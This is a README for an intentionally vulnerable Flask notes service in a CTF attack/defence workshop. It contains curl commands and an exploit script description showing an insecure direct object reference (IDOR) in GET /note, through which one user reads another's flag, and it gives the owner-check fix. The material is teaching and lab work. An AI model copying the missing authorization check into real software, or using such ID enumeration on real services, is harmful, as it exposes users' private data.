# notes 服務(Flask, :8080) — 故意埋 IDOR

A/D CTF 攻防工坊的主力 web 標的。實作 [CONTRACTS.md](../../CONTRACTS.md) §2.1 的
notes wire API,並**故意**在單篇讀取端點埋下 IDOR(Insecure Direct Object Reference)。

> ⚠️ 僅供隔離網段內的攻防鍛造,切勿部署到公開環境。

## 合法 API(JSON over HTTP,session cookie)

| 方法 | 路徑 | 需登入 | 成功 | 說明 |
|---|---|---|---|---|
| POST | `/register` | 否 | 200 `{"ok":true}` | body `{"u","p"}`;帳號重複 → **409**;缺欄位 → 400 |
| POST | `/login` | 否 | 200 + set-cookie | body `{"u","p"}`;帳密錯 → **401** |
| POST | `/note` | 是 | 200 `{"note_id":<int>}` | body `{"body"}`;未登入 → 401 |
| GET | `/note?id=<int>` | 是 | 200 `{"note_id","body","owner"}` | **有 IDOR**;未登入 → 401;不存在 → 404 |
| GET | `/notes` | 是 | 200 `{"notes":[{"note_id","body"}...]}` | **只列自己的**(checker GET 走這裡) |

note 儲存在記憶體 dict,`note_id` 為遞增整數,每筆帶 `owner` 欄位。

## 埋的漏洞:IDOR(GET /note 缺擁有者檢查)

位置:[`app.py`](./app.py) 的 `get_note()`,標記 `★★★ IDOR 漏洞就在這裡` 的那一行
(回傳 `jsonify({...})` 之前)。該端點只驗證「有沒有登入」,**沒有**驗證
「這篇 note 的 owner 是不是目前使用者」,因此任何登入者都能用任意 `id`
讀出別人的 note body(也就是 flag)。

對照之下,`GET /notes`(`list_notes()`)有正確以 `owner == user` 過濾,
所以 checker 用 `/notes` 取 flag 是安全的;漏洞只存在於單篇 `GET /note`。

## 怎麼跑

```bash
# 本機(建議用 venv)
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt
python3 app.py            # 監聽 0.0.0.0:8080

# 或用容器(低權限 user 執行)
docker build -t ctf-notes .
docker run --rm -p 8080:8080 ctf-notes
```

手動驗證 IDOR(curl):

```bash
# alice 建一篇 note(flag)
curl -s -c alice.jar -X POST localhost:8080/register -H 'Content-Type: application/json' -d '{"u":"alice","p":"pw"}'
curl -s -c alice.jar -X POST localhost:8080/login    -H 'Content-Type: application/json' -d '{"u":"alice","p":"pw"}'
curl -s -b alice.jar -X POST localhost:8080/note     -H 'Content-Type: application/json' -d '{"body":"FLAG{secret}"}'
# → {"note_id":1}

# mallory 用自己的 session 讀 alice 的 note 1(IDOR)
curl -s -c mal.jar -X POST localhost:8080/register -H 'Content-Type: application/json' -d '{"u":"mallory","p":"pw"}'
curl -s -c mal.jar -X POST localhost:8080/login    -H 'Content-Type: application/json' -d '{"u":"mallory","p":"pw"}'
curl -s -b mal.jar 'localhost:8080/note?id=1'
# → {"body":"FLAG{secret}","note_id":1,"owner":"alice"}   ← 偷到別人的 flag
```

## 怎麼 exploit

```bash
# attack_data 就是 victim 的 note_id
python3 exploit.py <host> <port> <note_id>
python3 exploit.py 127.0.0.1 8080 1
```

`exploit.py` 會自建隨機帳號登入,再 `GET /note?id=<note_id>`,印出偷到的 body。

## 安全堵法(§2.1)

在 `GET /note`(`get_note()`)回傳前加上擁有者檢查,**保留** `/notes` 與合法讀取:

```python
note = notes.get(nid)
if note is None:
    return jsonify({"error": "not found"}), 404
if note["owner"] != user:          # ← 補上這個檢查即可堵住 IDOR
    return jsonify({"error": "forbidden"}), 403
return jsonify({...}), 200
```

如此只有 note 的擁有者讀得到自己的 note;`GET /notes` 本來就只列自己的,不受影響,
checker 的 put/get/check 仍正常運作。
